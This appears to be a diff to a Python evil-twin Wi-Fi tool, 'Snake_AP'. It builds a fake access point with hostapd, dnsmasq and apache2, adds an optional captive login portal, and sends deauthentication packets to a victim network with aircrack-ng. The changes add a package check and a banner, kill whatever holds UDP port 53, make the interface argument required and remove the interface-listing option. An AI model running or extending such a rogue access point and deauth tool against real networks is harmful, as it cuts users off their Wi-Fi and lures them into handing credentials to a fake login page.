@@ -7,35 +7,57 @@ import subprocess
 from subprocess import PIPE
 import argparse
 from Snake_Package.Deauth_wifi import Deauth_Router
+from Snake_Package.banner import *
 
+print(Banner2)
 if os.geteuid() != 0 :
-   print("\n[+] Run as root or sudo\n ")
-   exit()
+    print("\n[+] Run as root or sudo ")
 else:
     pass
- 
+os.system("sudo fuser -k 53/udp >/dev/null 2>&1 ")
 
-os.system("sudo fuser -k 53/udp >/dev/null 2>&1 ")  
 Curent_dir  = os.path.abspath(os.getcwd())
 user_name   = os.path.dirname(os.path.abspath(__file__)).split ("/")[2]
+def Check_Packages(): 
+     list_Pakages = [
+                     "  which dnsmasq      > /dev/unll 2>&1 ",
+                     "  which apache2      > /dev/unll 2>&1",
+                     "  which hostapd      > /dev/unll 2>&1",
+                     "  which aircrack-ng  > /dev/unll 2>&1 "
+
+                    ]       
+     for package in list_Pakages :
+              test_packages = subprocess.call(  package ,shell=True,stderr=subprocess.PIPE,stdout=PIPE)  
+              if test_packages == 0  :                     
+                 continue
+              else:  
+                  for package in list_Pakages :
+                      test_packages = subprocess.call(  package ,shell=True,stderr=subprocess.PIPE,stdout=PIPE)  
+                      if test_packages != 0  : 
+                         if   'hostapd ' in package :
+                            package ='hostapd'
+                         elif 'apache2' in package :
+                             package =  'apache2' 
+                         elif "dnsmasq" in package :
+                             package = 'dnsmasq'   
+                         elif 'aircrack-ng' in package :
+                             package = 'aircrack-ng'              
+                         print ("[!] Error Package Not Found " ,package)
+                  os.system("sudo killall dnsmasq >/dev/null 2>&1")       
+                  exit()   
+Check_Packages()
 
 class Fake_access_point:
      
       def __init__(self):
           self.args_Control()
+          print("[+] ChecK Paskages ....Done !! ")
           if self.args.Deauth :
              os.system(" sudo iw dev wlan0 interface add wlansnake type station")  #sudo iw dev Sanke1 del 
-             print("\n[+] Snake add wlansnake intafeface wifi ....||  ")
+             print("\n[+] Snake_AP add 'wlansnake'  as Virtual Interfaces ......!! ")
           else:
                 pass 
-          if self.args.List:
-             list_Interface = os.listdir('/sys/class/net/') 
-             print("\n[+] List of Interfaces : \n"+("="*20)+"\n")
-             for device in list_Interface :
-                 print("[*] Interface : ",device)
-             print()
-             exit()           
-          self.check_InterFace()
+          
           self.Show_ap_all()
           self.Clean_IP_Table()
           self.Create_Fake()
@@ -44,17 +66,6 @@ class Fake_access_point:
           self.Start_InterFace()
           self.call_tremmial()
           
-      def check_InterFace(self):
-          if self.args.Interface:
-             list_Interface = os.listdir('/sys/class/net/') 
-             if self.args.Interface in list_Interface:
-                pass
-             else:
-               print("[*] | "+str(self.args.Interface)+ " |: error fetching interface information: Device not found") 
-               print("[*] use -L/--List to list all interface available")
-               exit()
-          else:
-              pass          
       def Show_ap_all(self):
           if self.args.Show:
               from Snake_Package.Show_AP import  Show_AP_all
@@ -85,7 +96,7 @@ class Fake_access_point:
                    os.mkdir(Curent_dir+"/Snake_config/") 
                    group  = "chown "+ user_name+ ":"+user_name +" *" 
                    os.system(group)             
-                   print("access dir config is create " )                   
+                   print("[+]  Sanke_AP Configrution hostapd and dnsmasq  is create " )                   
                    with open ('/etc/hostapd/hostapd.conf','w') as pathconfig :
                        pathconfig.write("DAEMON_CONF="+Curent_dir+"/Snake_config/hostapd.conf")               
               os.chdir(os.path.dirname(__file__)+"/Snake_config/")              
@@ -170,12 +181,11 @@ class Fake_access_point:
                 run = Captive_Portal()
       def args_Control(self):
             parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")
-            parser.add_argument( '-I  ',"--Interface" ,metavar='' , action=None,required = False ,help="Interface act AP 'Support AP Mode'" )               
+            parser.add_argument( '-I  ',"--Interface" ,metavar='' , action=None,required = True ,help="Interface act AP 'Support AP Mode'" )               
             parser.add_argument( '-S  ',"--Show", action='store_true' ,help="Show all access point around you [bssid-ssid-channel-sagenal]" )
             parser.add_argument( '-AP ',"--APName" ,metavar='' , action=None ,help = "Name of access point [ if not set the name option Defualit name is 'Free-wifi']")
             parser.add_argument( '-D  ',"--Deauth" ,metavar='' , action=None ,help = "send Deauth packet to the victom wifi [ airepay-ng ] ")
             parser.add_argument( '-CP ',"--Portal", action='store_true'  ,help = "set service wifi login page  [Captive_Portal]")
-            parser.add_argument( '-L ',"--List", action='store_true'  ,help = "list all Interface available ")
             self.args = parser.parse_args()
             if len(sys.argv)> 1 :
                  pass
